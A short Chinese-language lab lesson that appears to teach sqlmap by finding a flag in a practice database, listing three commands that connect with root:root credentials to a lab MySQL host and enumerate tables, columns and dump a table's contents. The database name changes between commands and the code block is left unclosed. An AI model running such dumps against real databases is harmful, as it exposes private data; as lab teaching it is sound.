# Lesson 1: 用 SQLMap 注出数据库数据

## 目标
从数据库中找出 flag，熟悉 sqlmap 参数。

## 命令回顾
1. 查看数据库有哪些表：
```bash
python3 sqlmap.py -d "mysql://root:root@sqlmap_mysql/teachdb" --tables

python3 /opt/sqlmap/sqlmap.py -d "mysql://root:root@sqlmap_mysql/TeachDatabase" -T TeachTable --columns

python3 /opt/sqlmap/sqlmap.py -d "mysql://root:root@sqlmap_mysql/TeachDatabase" -T TeachTable --dump